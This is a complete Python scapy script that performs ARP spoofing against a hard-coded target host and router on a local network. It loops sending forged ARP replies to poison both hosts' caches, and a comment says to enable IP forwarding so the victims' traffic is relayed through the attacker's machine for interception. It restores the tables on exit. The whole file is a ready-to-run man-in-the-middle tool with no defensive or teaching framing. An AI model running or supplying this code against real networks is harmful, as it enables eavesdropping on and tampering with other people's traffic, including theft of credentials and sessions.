#!/usr/bin/env python

#needs to enable ip forwarding packets with command:
#   echo 1 > /proc/sys/net/ipv4/ip_forward 

import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=macs[target_ip], psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=macs[destination_ip], psrc=source_ip, hwsrc=macs[source_ip])
    scapy.send(packet, count=4, verbose=False)


target_ip = "192.168.165.83"
router_ip = "192.168.165.226"
macs = {
    target_ip: get_mac(target_ip),
    router_ip: get_mac(router_ip)
    }
print("target: " + target_ip + " " + macs[target_ip])
print("router: " + router_ip + " " + macs[router_ip])

sent_packets_count = 0
try:
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Resetting ARP tables... \n")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)



